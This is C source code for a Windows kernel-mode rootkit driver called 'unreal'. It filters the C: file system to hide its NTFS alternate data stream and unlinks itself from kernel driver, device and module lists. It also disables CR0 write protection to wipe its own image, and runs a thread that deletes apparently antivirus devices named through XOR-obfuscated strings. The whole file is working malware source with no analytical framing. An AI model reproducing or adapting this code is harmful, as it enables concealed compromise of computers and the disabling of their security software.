#define UNICODE
#define VER_PRODUCTBUILD 2600

#include "Z:\Projects\unreal_a\nulldrv\ntoskrnl.h"
#include "Z:\Projects\unreal_a\nulldrv\ntfs.h"
#include "Z:\Projects\unreal_a\nulldrv\rtl.h"

#pragma warning(disable:4100)
#pragma warning(disable:4311)
#pragma warning(disable:4312)

#define align_pointer(p) PVOID(ULONG(p) & 0xfffff000)

PDEVICE_OBJECT	fsdev = NULL, pdev1;
PDRIVER_OBJECT	ThisDrv;
LARGE_INTEGER	MemorySize, RootDirOffset;
DWORD			cr0_save, dwBytesPerFileRecord;
PFILE_RECORD_HEADER	rootrec;

void memopen();
void memclose();
BOOLEAN __stdcall CheckPointer(PVOID xptr, ULONG size);

NTSTATUS Process_StreamInf(PFILE_STREAM_INFORMATION inf)
{
	PFILE_STREAM_INFORMATION	inf_tmp, inf_current, inf_prev;
	UINT	len;
	WCHAR	textbuf[MAX_PATH];
	NTSTATUS retval = STATUS_SUCCESS;

	inf_current = inf;
	inf_prev = inf_current;

	do
	{
		strcpynW(textbuf, inf_current->StreamName, inf_current->StreamNameLength / 2);
		if ( strcmpiW(textbuf, L":unreal.sys:$DATA") == 0 )
		{
			len = inf_current->NextEntryOffset;
			memzero(inf_current, sizeof(FILE_STREAM_INFORMATION) + inf_current->StreamNameLength - 4);
			inf_current->NextEntryOffset = len;
			if (inf_current == inf_prev)
			{
				if (inf_current->NextEntryOffset == 0)
				{
					retval = STATUS_NO_MORE_FILES;
				}
				else
				{
					inf_tmp = (PFILE_STREAM_INFORMATION)((PBYTE)inf_current + inf_current->NextEntryOffset);
					len = inf_current->NextEntryOffset;
					memcopy(inf_current, inf_tmp, inf_tmp->NextEntryOffset);
					inf_current->NextEntryOffset += len;
				}
			}
			else
			{
				if (inf_current->NextEntryOffset == 0)
				{
					inf_prev->NextEntryOffset = 0;
				}
				else
				{
					inf_prev->NextEntryOffset += inf_current->NextEntryOffset;
				}
			}
		}

		if (inf_current->NextEntryOffset == 0) break;
		inf_prev = inf_current;
		inf_current = (PFILE_STREAM_INFORMATION)((PBYTE)inf_current + inf_current->NextEntryOffset);
	} while (true);

	return retval;
}

void processFile(PFILE_RECORD_HEADER file_buf)
{
	PATTRIBUTE attr1 = (PATTRIBUTE)padd(file_buf, file_buf->AttributesOffset), attr_prev;
	WCHAR textbuf[MAX_PATH];

	attr_prev = attr1;
	while (attr1->AttributeType != 0xffffffff)
	{
		if (attr1->AttributeType == AttributeData)
		{
			if (attr1->NameLength > 0)
			{
				strcpynW(textbuf, (PWCHAR)padd(attr1, attr1->NameOffset), attr1->NameLength);
				if ( strcmpiW(textbuf, L"unreal.sys") == 0 )
				{
					attr_prev->Length += attr1->Length;
					memzero(attr1, attr1->Length);
				}
			}
		}
		attr_prev = attr1;
		attr1 = (PATTRIBUTE)padd(attr1, attr1->Length);
		if (attr1->Length == 0) break;
	}
}

NTSTATUS __stdcall HandleIOCTL(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
	bool			DrvCalled = false;
	NTSTATUS		retval = STATUS_SUCCESS;
	LARGE_INTEGER	byte_ofs, ofs2;
	ULONG			byte_count;
	PVOID			pBuffer;
	PIO_STACK_LOCATION currentIOST = IoGetCurrentIrpStackLocation(Irp);

	byte_ofs.QuadPart = currentIOST->Parameters.Read.ByteOffset.QuadPart;
	byte_count = currentIOST->Parameters.Read.Length;

	IoSkipCurrentIrpStackLocation(Irp);

	if (currentIOST->MajorFunction == IRP_MJ_CREATE)
	{
		if ( MmIsAddressValid(currentIOST->FileObject) )
			if ( MmIsAddressValid(currentIOST->FileObject->FileName.Buffer) )
				if ( strcmpiW(currentIOST->FileObject->FileName.Buffer, L"\\:unreal.sys") == 0)
				{
					Irp->IoStatus.Status = 0xc0000034;
					Irp->UserIosb->Status = 0xc0000034;
					IofCompleteRequest(Irp, IO_NO_INCREMENT);
					return 0xc0000034; // STATUS_OBJECT_NAME_NOT_FOUND
				}
	}

	if ( (currentIOST->MajorFunction == IRP_MJ_QUERY_INFORMATION) &
		(currentIOST->Parameters.QueryFile.FileInformationClass == FileStreamInformation) )
	{
		DrvCalled = true;
		retval = IofCallDriver(fsdev, Irp);
		if ( retval == STATUS_SUCCESS )
			retval = Process_StreamInf((PFILE_STREAM_INFORMATION)Irp->AssociatedIrp.SystemBuffer);
	}

	if ( !DrvCalled )
		retval = IofCallDriver(fsdev, Irp);

	if ( MmIsAddressValid(Irp->MdlAddress) )
	{
		pBuffer = PBYTE(PMDL(Irp->MdlAddress)->StartVa) + PMDL(Irp->MdlAddress)->ByteOffset;
	}
	else
	{
		pBuffer = Irp->UserBuffer;
	}

	if ( (currentIOST->MajorFunction == IRP_MJ_READ) & (retval == STATUS_SUCCESS) &
		((byte_ofs.LowPart % 512u) == 0) & ((byte_count % 512u) == 0) )
	{
		if ( byte_count >= dwBytesPerFileRecord )
			if ( (byte_ofs.QuadPart <= RootDirOffset.QuadPart) &
				 (byte_ofs.QuadPart + byte_count >= RootDirOffset.QuadPart + dwBytesPerFileRecord) )
			{
				ofs2.QuadPart = RootDirOffset.QuadPart - byte_ofs.QuadPart;
				pBuffer = padd(pBuffer, ofs2.LowPart);
				if ( CheckPointer(pBuffer, dwBytesPerFileRecord) )
				{
					PFILE_RECORD_HEADER fbuf = (PFILE_RECORD_HEADER)pBuffer;
					if ( (fbuf->Ntfs.Type == NTFS_SIGN_FILE) & (fbuf->Ntfs.UsaCount >= 1))
						if ( 512u * (fbuf->Ntfs.UsaCount - 1) <= byte_count )
						{
							FixUpdateSequenceArray(fbuf);
							processFile(fbuf);
							FixUpdateSequenceArray(fbuf);
						}
				}
			}

		if ( byte_count == 512u )
		{
			if (byte_ofs.QuadPart == RootDirOffset.QuadPart)
				memcopy(pBuffer, rootrec, 512u);
			if (byte_ofs.QuadPart == RootDirOffset.QuadPart + 512u)
				memcopy(pBuffer, padd(rootrec, 512u), 512u);
		}
	}
	return retval;
}

void HookDrive()
{
	UNICODE_STRING		diskname;
	OBJECT_ATTRIBUTES	attr1;
	IO_STATUS_BLOCK		iost;
	HANDLE				f;
	PFILE_OBJECT		fobj;
	LARGE_INTEGER		ofs1;
	NTFS5_BOOT_RECORD	bootrec;
	DWORD				dwClusterSize;

	RtlInitUnicodeString(&diskname, L"\\??\\C:");
	attr1.Length = sizeof(OBJECT_ATTRIBUTES);
	attr1.RootDirectory = NULL;
	attr1.ObjectName = &diskname;
	attr1.Attributes = OBJ_CASE_INSENSITIVE;
	attr1.SecurityDescriptor = NULL;
	attr1.SecurityQualityOfService = NULL;

	if ( ZwCreateFile(	&f,
						SYNCHRONIZE | FILE_READ_ACCESS,
						&attr1,
						&iost,
						NULL,
						0,
						FILE_SHARE_READ | FILE_SHARE_WRITE,
						FILE_OPEN,
						FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE, NULL, 0) == STATUS_SUCCESS )
	{
		ofs1.QuadPart = 0;
		if (ZwReadFile(f, NULL, NULL, NULL, &iost, &bootrec, 512u, &ofs1, NULL) == STATUS_SUCCESS)
		{
			dwClusterSize = bootrec.wBytesPerSector * bootrec.bSectorsPerCluster;
			if (bootrec.ClustersPerFileRecord < 0x80)
				dwBytesPerFileRecord = dwClusterSize * bootrec.ClustersPerFileRecord;
			else
				dwBytesPerFileRecord = (1 << (0x100 - bootrec.ClustersPerFileRecord));
			
			RootDirOffset.QuadPart = dwBytesPerFileRecord * 5;
			for (DWORD c = 0; c < dwClusterSize; c++)
			{
				__asm
				{
					nop
				}
				RootDirOffset.QuadPart += bootrec.MftStartLcn;
			}
			rootrec = (PFILE_RECORD_HEADER)ExAllocatePoolWithTag(NonPagedPool, dwBytesPerFileRecord, 0x78554433);

			ofs1.QuadPart = RootDirOffset.QuadPart;
			ZwReadFile(f, NULL, NULL, NULL, &iost, rootrec, dwBytesPerFileRecord, &ofs1, NULL);
			FixUpdateSequenceArray(rootrec);
			processFile(rootrec);
			FixUpdateSequenceArray(rootrec);
		}
		ZwClose(f);
	}

	RtlInitUnicodeString(&diskname, L"\\??\\C:\\");
	attr1.Length = sizeof(OBJECT_ATTRIBUTES);
	attr1.RootDirectory = NULL;
	attr1.ObjectName = &diskname;
	attr1.Attributes = OBJ_CASE_INSENSITIVE;
	attr1.SecurityDescriptor = NULL;
	attr1.SecurityQualityOfService = NULL;

	if ( ZwCreateFile(	&f,
						SYNCHRONIZE | FILE_ANY_ACCESS,
						&attr1,
						&iost,
						NULL,
						0,
						FILE_SHARE_READ | FILE_SHARE_WRITE,
						FILE_OPEN,
						FILE_SYNCHRONOUS_IO_NONALERT | FILE_DIRECTORY_FILE, NULL, 0) == STATUS_SUCCESS )
	{
		if ( ObReferenceObjectByHandle(f, FILE_READ_DATA, NULL, KernelMode, (PVOID *)&fobj, NULL) == STATUS_SUCCESS )
		{
			fsdev = IoGetBaseFileSystemDeviceObject(fobj);
			ObfDereferenceObject(fobj);
			pdev1->Characteristics = fsdev->Characteristics;
			pdev1->DeviceType = fsdev->DeviceType;
			pdev1->Flags = fsdev->Flags & (~DO_DEVICE_INITIALIZING);
			pdev1->AlignmentRequirement = fsdev->AlignmentRequirement;
			pdev1->StackSize = fsdev->StackSize + 1;

			IoAttachDeviceToDeviceStack(pdev1, fsdev);
		}
		ZwClose(f);
	}
}

BOOLEAN __stdcall CheckPointer(PVOID xptr, ULONG size)
{
	PHYSICAL_ADDRESS addr1;
	PVOID p1 = align_pointer(xptr), p2 = align_pointer(ULONG(xptr) + size - 1);
	bool c1 = false, c2 = false;

	if ( xptr == NULL )
		return false;

	if (p1 >= MmSystemRangeStart)
	{
		if ( MmIsAddressValid(p1) )
		{
			addr1 = MmGetPhysicalAddress(p1);
			if (addr1.QuadPart < MemorySize.QuadPart)
			{
				c1 = ( MmGetVirtualForPhysical(addr1) == p1 );
			}
		}

		if ( MmIsAddressValid(p2) )
		{
			addr1 = MmGetPhysicalAddress(p2);
			if (addr1.QuadPart < MemorySize.QuadPart)
			{
				c2 = ( MmGetVirtualForPhysical(addr1) == p2 );
			}
		}

		return (c1 & c2);
	}
	else
	{
		addr1 = MmGetPhysicalAddress(p1);
		if (addr1.QuadPart < MemorySize.QuadPart)
		{
			c1 = ( MmGetVirtualForPhysical(addr1) == p1 );
		}
		addr1 = MmGetPhysicalAddress(p2);
		if (addr1.QuadPart < MemorySize.QuadPart)
		{
			c2 = ( MmGetVirtualForPhysical(addr1) == p2 );
		}
		return (c1 & c2);
	}
}

BOOLEAN __stdcall RkFastIoCheckIfPossible(
  IN struct _FILE_OBJECT  *FileObject,
  IN PLARGE_INTEGER  FileOffset,
  IN ULONG  Length,
  IN BOOLEAN  Wait,
  IN ULONG  LockKey,
  IN BOOLEAN  CheckForReadOperation,
  OUT PIO_STATUS_BLOCK  IoStatus,
  IN struct _DEVICE_OBJECT  *DeviceObject)
{
	return false;
}

BOOLEAN __stdcall RkFastIoRead(
  IN struct _FILE_OBJECT  *FileObject,
  IN PLARGE_INTEGER  FileOffset,
  IN ULONG  Length,
  IN BOOLEAN  Wait,
  IN ULONG  LockKey,
  OUT PVOID  Buffer,
  OUT PIO_STATUS_BLOCK  IoStatus,
  IN struct _DEVICE_OBJECT  *DeviceObject)
{
	return false;
}

BOOLEAN __stdcall RkFastIoWrite(
  IN struct _FILE_OBJECT  *FileObject,
  IN PLARGE_INTEGER  FileOffset,
  IN ULONG  Length,
  IN BOOLEAN  Wait,
  IN ULONG  LockKey,
  IN PVOID  Buffer,
  OUT PIO_STATUS_BLOCK  IoStatus,
  IN struct _DEVICE_OBJECT  *DeviceObject)
{
	return false;
}

BOOLEAN __stdcall RkFastIoQueryBasicInfo(
  IN struct _FILE_OBJECT  *FileObject,
  IN BOOLEAN  Wait,
  OUT PFILE_BASIC_INFORMATION  Buffer,
  OUT PIO_STATUS_BLOCK  IoStatus,
  IN struct _DEVICE_OBJECT  *DeviceObject)
{
	return false;
}

BOOLEAN __stdcall RkFastIoQueryStandardInfo(
  IN struct _FILE_OBJECT  *FileObject,
  IN BOOLEAN  Wait,
  OUT PFILE_STANDARD_INFORMATION  Buffer,
  OUT PIO_STATUS_BLOCK  IoStatus,
  IN struct _DEVICE_OBJECT  *DeviceObject)
{
	return false;
}

BOOLEAN __stdcall RkFastIoLock(
  IN struct _FILE_OBJECT  *FileObject,
  IN PLARGE_INTEGER  FileOffset,
  IN PLARGE_INTEGER  Length,
  PEPROCESS  ProcessId,
  ULONG  Key,
  BOOLEAN  FailImmediately,
  BOOLEAN  ExclusiveLock,
  OUT PIO_STATUS_BLOCK  IoStatus,
  IN struct _DEVICE_OBJECT  *DeviceObject)
{
	return false;
}

BOOLEAN __stdcall RkFastIoUnlockSingle(
  IN struct _FILE_OBJECT  *FileObject,
  IN PLARGE_INTEGER  FileOffset,
  IN PLARGE_INTEGER  Length,
  PEPROCESS  ProcessId,
  ULONG  Key,
  OUT PIO_STATUS_BLOCK  IoStatus,
  IN struct _DEVICE_OBJECT  *DeviceObject)
{
	return false;
}

BOOLEAN __stdcall RkFastIoUnlockAll(
  IN struct _FILE_OBJECT  *FileObject,
  PEPROCESS  ProcessId,
  OUT PIO_STATUS_BLOCK  IoStatus,
  IN struct _DEVICE_OBJECT  *DeviceObject)
{
	return false;
}

BOOLEAN __stdcall RkFastIoUnlockAllByKey(
  IN struct _FILE_OBJECT  *FileObject,
  PVOID  ProcessId,
  ULONG  Key,
  OUT PIO_STATUS_BLOCK  IoStatus,
  IN struct _DEVICE_OBJECT  *DeviceObject)
{
	return false;
}

BOOLEAN __stdcall RkFastIoDeviceControl(
  IN struct _FILE_OBJECT  *FileObject,
  IN BOOLEAN  Wait,
  IN PVOID  InputBuffer  OPTIONAL,
  IN ULONG  InputBufferLength,
  OUT PVOID  OutputBuffer  OPTIONAL,
  IN ULONG  OutputBufferLength,
  IN ULONG  IoControlCode,
  OUT PIO_STATUS_BLOCK  IoStatus,
  IN struct _DEVICE_OBJECT  *DeviceObject)
{
	return false;
}

VOID __stdcall RkAcquireFileForNtCreateSection(
  IN struct _FILE_OBJECT  *FileObject)
{
}

VOID __stdcall RkReleaseFileForNtCreateSection(
  IN struct _FILE_OBJECT  *FileObject)
{
}

VOID __stdcall RkFastIoDetachDevice(
  IN struct _DEVICE_OBJECT  *SourceDevice,
  IN struct _DEVICE_OBJECT  *TargetDevice)
{
}

BOOLEAN __stdcall RkFastIoQueryNetworkOpenInfo(
  IN struct _FILE_OBJECT  *FileObject,
  IN BOOLEAN  Wait,
  OUT struct _FILE_NETWORK_OPEN_INFORMATION  *Buffer,
  OUT struct _IO_STATUS_BLOCK  *IoStatus,
  IN struct _DEVICE_OBJECT  *DeviceObject)
{
	return false;
}

NTSTATUS __stdcall RkAcquireForModWrite(
  IN struct _FILE_OBJECT  *FileObject,
  IN PLARGE_INTEGER  EndingOffset,
  OUT struct _ERESOURCE  **ResourceToRelease,
  IN struct _DEVICE_OBJECT  *DeviceObject)
{
	return false;
}

BOOLEAN __stdcall RkMdlRead(
  IN struct _FILE_OBJECT  *FileObject,
  IN PLARGE_INTEGER  FileOffset,
  IN ULONG  Length,
  IN ULONG  LockKey,
  OUT PMDL  *MdlChain,
  OUT PIO_STATUS_BLOCK  IoStatus,
  IN struct _DEVICE_OBJECT  *DeviceObject)
{
	return false;
}

BOOLEAN __stdcall RkMdlReadComplete(
  IN struct _FILE_OBJECT *FileObject,
  IN PMDL MdlChain,
  IN struct _DEVICE_OBJECT *DeviceObject)
{
	return false;
}

BOOLEAN __stdcall RkPrepareMdlWrite(
  IN struct _FILE_OBJECT  *FileObject,
  IN PLARGE_INTEGER  FileOffset,
  IN ULONG  Length,
  IN ULONG  LockKey,
  OUT PMDL  *MdlChain,
  OUT PIO_STATUS_BLOCK  IoStatus,
  IN struct _DEVICE_OBJECT  *DeviceObject)
{
	return false;
}

BOOLEAN __stdcall RkMdlWriteComplete(
  IN struct _FILE_OBJECT  *FileObject,
  IN PLARGE_INTEGER  FileOffset,
  IN PMDL  MdlChain,
  IN struct _DEVICE_OBJECT  *DeviceObject)
{
	return false;
}

BOOLEAN __stdcall RkFastIoReadCompressed(
  IN struct _FILE_OBJECT  *FileObject,
  IN PLARGE_INTEGER  FileOffset,
  IN ULONG  Length,
  IN ULONG  LockKey,
  OUT PVOID  Buffer,
  OUT PMDL  *MdlChain,
  OUT PIO_STATUS_BLOCK  IoStatus,
  OUT struct _COMPRESSED_DATA_INFO  *CompressedDataInfo,
  IN ULONG  CompressedDataInfoLength,
  IN struct _DEVICE_OBJECT  *DeviceObject)
{
	return false;
}

BOOLEAN __stdcall RkFastIoWriteCompressed(
  IN struct _FILE_OBJECT  *FileObject,
  IN PLARGE_INTEGER  FileOffset,
  IN ULONG  Length,
  IN ULONG  LockKey,
  IN PVOID  Buffer,
  OUT PMDL  *MdlChain,
  OUT PIO_STATUS_BLOCK  IoStatus,
  IN struct _COMPRESSED_DATA_INFO  *CompressedDataInfo,
  IN ULONG  CompressedDataInfoLength,
  IN struct _DEVICE_OBJECT  *DeviceObject)
{
	return false;
}

BOOLEAN __stdcall RkMdlReadCompleteCompressed(
  IN struct _FILE_OBJECT  *FileObject,
  IN PMDL  MdlChain,
  IN struct _DEVICE_OBJECT  *DeviceObject)
{
	return false;
}

BOOLEAN __stdcall RkMdlWriteCompleteCompressed(
  IN struct _FILE_OBJECT  *FileObject,
  IN PLARGE_INTEGER  FileOffset,
  IN PMDL  MdlChain,
  IN struct _DEVICE_OBJECT  *DeviceObject)
{
	return false;
}

BOOLEAN __stdcall RkFastIoQueryOpen(
  IN struct _IRP  *Irp,
  OUT PFILE_NETWORK_OPEN_INFORMATION  NetworkInformation,
  IN struct _DEVICE_OBJECT  *DeviceObject)
{
	return false;
}

NTSTATUS __stdcall RkReleaseForModWrite(
  IN struct _FILE_OBJECT  *FileObject,
  IN struct _ERESOURCE  *ResourceToRelease,
  IN struct _DEVICE_OBJECT  *DeviceObject)
{
	return false;
}

NTSTATUS __stdcall RkAcquireForCcFlush(
  IN struct _FILE_OBJECT  *FileObject,
  IN struct _DEVICE_OBJECT  *DeviceObject)
{
	return false;
}

NTSTATUS __stdcall RkReleaseForCcFlush(
  IN struct _FILE_OBJECT  *FileObject,
  IN struct _DEVICE_OBJECT  *DeviceObject)
{
	return false;
}

FAST_IO_DISPATCH FastIo = {
	sizeof(FAST_IO_DISPATCH),
	RkFastIoCheckIfPossible,
	RkFastIoRead,
	RkFastIoWrite,
	RkFastIoQueryBasicInfo,
	RkFastIoQueryStandardInfo,
	RkFastIoLock,
	RkFastIoUnlockSingle,
	RkFastIoUnlockAll,
	RkFastIoUnlockAllByKey,
	RkFastIoDeviceControl,
	RkAcquireFileForNtCreateSection,
	RkReleaseFileForNtCreateSection,
	RkFastIoDetachDevice,
	RkFastIoQueryNetworkOpenInfo,
	RkAcquireForModWrite,
	RkMdlRead,
	RkMdlReadComplete,
	RkPrepareMdlWrite,
	RkMdlWriteComplete,
	RkFastIoReadCompressed,
	RkFastIoWriteCompressed,
	RkMdlReadCompleteCompressed,
	RkMdlWriteCompleteCompressed,
	RkFastIoQueryOpen,
	RkReleaseForModWrite,
	RkAcquireForCcFlush,
	RkReleaseForCcFlush
};

__declspec(naked) void memopen()
{
	__asm
	{
		cli
		mov eax, cr0
		mov cr0_save, eax
		and eax, 0xfffeffff
		mov cr0, eax
		retn
	}
}

__declspec(naked) void memclose()
{
	__asm
	{
		mov eax, cr0_save
		mov cr0, eax
		sti
		retn
	}
}

void EnumDrivers2()
{
	POBJECT_TYPE	sec_type = IoDriverObjectType;
	PLIST_ENTRY		e_prev, e_next, entry0 = sec_type->ObjectListHead.Flink, entry1 = entry0;
	PDRIVER_OBJECT	obj1;

	do
	{
		obj1 = (PDRIVER_OBJECT)((PBYTE)entry1 + 0x28);
		if (obj1 == ThisDrv)
		{
			e_prev = entry1->Blink;
			e_next = entry1->Flink;
			e_prev->Flink = e_next;
			e_next->Blink = e_prev;
		}
 		entry1 = entry1->Flink;
	} while (entry0 != entry1);
}

void EnumDevices2()
{
	POBJECT_TYPE	sec_type = IoDeviceObjectType;
	PLIST_ENTRY		e_prev, e_next, entry0 = sec_type->ObjectListHead.Flink, entry1 = entry0;
	PDEVICE_OBJECT	obj1;

	do
	{
		obj1 = (PDEVICE_OBJECT)((PBYTE)entry1 + 0x28);
		if ((obj1 == pdev1) || (obj1->DriverObject == ThisDrv))
		{
			e_prev = entry1->Blink;
			e_next = entry1->Flink;
			e_prev->Flink = e_next;
			e_next->Blink = e_prev;
		}
 		entry1 = entry1->Flink;
	} while (entry0 != entry1);
}

WCHAR	obname[MAX_PATH], avgdev_tmp[24], avzdev_tmp[24];
ULONG			bytesIO;
PDEVICE_OBJECT	pavzdev, pavgdev;

void ListDriverObjectsRecursive(POBJECT_DIRECTORY DirObject)
{
	POBJECT_DIRECTORY_ITEM		item0, item1, itemprev;
	POBJECT_TYPE				DirectoryType = ((POBJECT_HEADER)((PBYTE)DirObject - 0x18))->ObjectType;
	POBJECT_HEADER				driverHead;
	PDRIVER_OBJECT				tmpDriver;
	PDEVICE_OBJECT				tmpDevice;
	ULONG						c;

	for (c = 0; c < 0x25; c++)
	{
		item0 = DirObject->HashEntries[c];
		if ((item0 != NULL))
		{
			item1 = item0;
			itemprev = item0;
			do
			{
				driverHead = (POBJECT_HEADER)((PBYTE)item1->Object - 0x18);
				if (driverHead->ObjectType == IoDriverObjectType)
				{
					tmpDriver = (PDRIVER_OBJECT)item1->Object;
					if (tmpDriver == ThisDrv)
					{
						driverHead->ObjectType->ObjectCount--;
						if (itemprev == item1)
						{
							DirObject->HashEntries[c] = item1->Next;
						}
						else
						{
							itemprev->Next = item1->Next;
						}
					}
				}

				if (driverHead->ObjectType == IoDeviceObjectType)
				{
					tmpDevice = (PDEVICE_OBJECT)item1->Object;

					memzero(&obname, sizeof(obname));
					ObQueryNameString((PVOID)tmpDevice, (POBJECT_NAME_INFORMATION)&obname, sizeof(obname), &bytesIO);  
					if (strcmpinW(&obname[4], avgdev_tmp, 16) == 0)
						pavgdev = tmpDevice;
					if (strcmpinW(&obname[4], avzdev_tmp, 11) == 0)
						pavzdev = tmpDevice;

					if (tmpDevice == pdev1)
					{
						driverHead->ObjectType->ObjectCount--;
						if (itemprev == item1)
						{
							DirObject->HashEntries[c] = item1->Next;
						}
						else
						{
							itemprev->Next = item1->Next;
						}
					}
				}

				if (driverHead->ObjectType == DirectoryType)
					ListDriverObjectsRecursive((POBJECT_DIRECTORY)item1->Object);

				itemprev = item1;
				item1 = item1->Next;
			} while (item1 != NULL);
		}
	}
}

void ListDriverObjects()
{
	OBJECT_ATTRIBUTES	DirAttr;
	UNICODE_STRING		DirName;
	HANDLE				DirHandle;
	POBJECT_DIRECTORY	RootDirectory;

	RtlInitUnicodeString(&DirName, L"\\");

	DirAttr.Length = sizeof(OBJECT_ATTRIBUTES);
	DirAttr.RootDirectory = NULL;
	DirAttr.ObjectName = &DirName;
	DirAttr.Attributes = OBJ_CASE_INSENSITIVE;
	DirAttr.SecurityDescriptor = NULL;
	DirAttr.SecurityQualityOfService = NULL;

	if (ZwOpenDirectoryObject(&DirHandle, 0, &DirAttr) == STATUS_SUCCESS)
	{
		if (ObReferenceObjectByHandle(DirHandle, 0, NULL, KernelMode, (PVOID *)&RootDirectory, NULL) == STATUS_SUCCESS)
		{
			ObfDereferenceObject((PVOID)RootDirectory);
			ListDriverObjectsRecursive(RootDirectory);
		}
		ZwClose(DirHandle);
	}
}

void HideModule()
{
	PLDR_DATA_TABLE_ENTRY section = (PLDR_DATA_TABLE_ENTRY)ThisDrv->DriverSection;
	PLIST_ENTRY entryPrev, entryNext;

	if (section != NULL)
	{
		POBJECT_HEADER driverHead = (POBJECT_HEADER)((PBYTE)ThisDrv - 0x18);

		EnumDrivers2();
		EnumDevices2();
		ListDriverObjects();

		entryPrev = section->InLoadOrderModuleList.Blink;
		entryNext = section->InLoadOrderModuleList.Flink;
		entryPrev->Flink = entryNext;
		entryNext->Blink = entryPrev;

		memopen();
		memzero(ThisDrv->DriverStart, 0x100);
		memclose();

		memzero(driverHead, 0x18);
		memzero(ThisDrv->DriverName.Buffer, ThisDrv->DriverName.Length);
		memzero(section->BaseDllName.Buffer, section->BaseDllName.Length);
		memzero(section->FullDllName.Buffer, section->FullDllName.Length);
		memzero(section, sizeof(LDR_DATA_TABLE_ENTRY));
		memzero(ThisDrv->DriverExtension->ServiceKeyName.Buffer,
			ThisDrv->DriverExtension->ServiceKeyName.Length);
		memzero(ThisDrv->DriverExtension, sizeof(DRIVER_EXTENSION));
	}
}

const BYTE avgdev[16] = {0xA3, 0xBA, 0x98, 0xAA, 0x92, 0xB9, 0x9C, 0xA4, 0xB6, 0x80, 0xB2, 0xAB, 0xB2, 0x9C, 0xA5, 0x99};
const BYTE avzdev[11] = {0xA3, 0x9a, 0xb8, 0x8a, 0xb2, 0x99, 0xbc, 0xA4, 0x96, 0xa0, 0x8f};

void RemoveShit()
{
	BYTE			c;

	memzero(&avgdev_tmp, sizeof(avgdev_tmp));
	memzero(&avzdev_tmp, sizeof(avzdev_tmp));

	for (c = 0; c < 16; c++)
		avgdev_tmp[c] = avgdev[c] ^ (255 - c);
	for (c = 0; c < 11; c++)
		avzdev_tmp[c] = avzdev[c] ^ (255 - c);

	ListDriverObjects();
	memzero(&avgdev_tmp, sizeof(avgdev_tmp));
	memzero(&avzdev_tmp, sizeof(avzdev_tmp));
}

VOID __stdcall ThreadEntry1(IN PVOID  StartContext)
{
	LARGE_INTEGER tm;
	tm.QuadPart = -10000000;
	PULONG ThreadObject1 = (PULONG)PsGetCurrentThread();

	for (int c = 0; c < 0x280; c++)
	{
		if ( ThreadObject1[c] == (ULONG)&ThreadEntry1 )
			ThreadObject1[c] = (ULONG)( (PBYTE)&RtlInitUnicodeString + 0x230 );
	}

	KeDelayExecutionThread(KernelMode, FALSE, &tm);

	HideModule();

	while (true)
	{
		pavzdev = NULL;
		pavgdev = NULL;
		RemoveShit();
		if (pavzdev != NULL)
			IoDeleteDevice(pavzdev);
		if (pavgdev != NULL)
			IoDeleteDevice(pavgdev);
		DbgPrint(">> unreal");
		KeWaitForSingleObject(PsGetCurrentThread(), Executive, KernelMode, FALSE, &tm);
	}
}

VOID __stdcall Unload(IN PDRIVER_OBJECT  DriverObject)
{
	if (fsdev != NULL)
	{
		IoDetachDevice(fsdev);
	}
	IoDeleteDevice(pdev1);
}

NTSTATUS __stdcall DriverEntry(IN PDRIVER_OBJECT  DriverObject, IN PUNICODE_STRING  RegistryPath)
{
	NTSTATUS ntst;
	SYSTEM_BASIC_INFORMATION inf2;
	ULONG bytesIO;
	OBJECT_ATTRIBUTES attr1;
	HANDLE hThread1;
	
	ThisDrv = DriverObject;
	RootDirOffset.QuadPart = 0;

	ntst = IoCreateDevice(DriverObject, 0, NULL, FILE_DEVICE_UNKNOWN, 0, FALSE, &pdev1);
	if (ntst == STATUS_SUCCESS)
	{
		DriverObject->DriverUnload = &Unload;
		for (int c = 0; c <= IRP_MJ_MAXIMUM_FUNCTION; c++)
			DriverObject->MajorFunction[c] = &HandleIOCTL;
		DriverObject->FastIoDispatch = &FastIo;

		ZwQuerySystemInformation(SystemBasicInformation, &inf2, sizeof(SYSTEM_BASIC_INFORMATION), &bytesIO);
        MemorySize.QuadPart = inf2.PhysicalPageSize * inf2.NumberOfPhysicalPages;
		HookDrive();
	}

	attr1.Length = sizeof(OBJECT_ATTRIBUTES);
	attr1.RootDirectory = NULL;
	attr1.ObjectName = NULL;
	attr1.Attributes = OBJ_KERNEL_HANDLE;
	attr1.SecurityDescriptor = NULL;
	attr1.SecurityQualityOfService = NULL;

	if ( PsCreateSystemThread(&hThread1, THREAD_ALL_ACCESS, &attr1, NULL, NULL, &ThreadEntry1, 0) == STATUS_SUCCESS )
		ZwClose(hThread1);

	return ntst;
}